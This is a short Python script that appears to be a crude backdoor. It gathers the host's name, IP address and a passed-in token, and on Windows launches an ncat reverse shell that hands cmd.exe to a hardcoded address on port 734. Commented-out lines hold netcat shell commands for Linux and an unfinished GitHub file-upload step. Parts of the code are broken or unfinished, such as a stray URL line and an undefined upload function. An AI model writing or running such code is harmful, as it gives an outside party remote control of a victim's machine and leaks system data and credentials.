import platform
import os
import sysconfig
import socket
import json
import base64
import requests

def create_file(file_path, content):
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(content)

def delete_file(file_path):
    os.remove(file_path)

    url = f"https://api.github.com/repos/kaki714/Not/contents/data/data.txt"
  
  
        

def run(token):
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname) 
    iph='172.16.21.110'
    fname="data.txt"
    print('')
    print(' ############### # # # ##############')
    print(' ####### ###### # #  # # ####### ####')
    print(' ######   ##### ##    ## ######   ###')
    print(' ####### #######  #  #  ######## ####')
    print(' ################ ### ###############')
    print('')
    print('# OS name: ', platform.system())
    if "Linux" in platform.system():
        print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
        print(' IpAddress: ', IPAddr)
        print('insert Filename to upload: ')
        archive=input()
        #upload_file_to_github(archive)
        #os.system( 'nc -lvp 734 -e /bin/sh')
        #os.system('nc' + iph+ ' 734 -e /bin/sh')
    elif "Windows" in platform.system():
        print('Windows: ', sysconfig.get_platform(),' === CONNECTED ') 
        print('Address ip: ', IPAddr)
        print('TokenData: ', token)
        stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'\n'
        print("text stmnt: "+ stmnt)
        create_file(fname,stmnt)
        
        delete_file("data.txt")
        
        #os.system('ncat -lvp 734 -e cmd.exe')
        os.system('ncat '+ iph +' 734 -e cmd.exe')
    
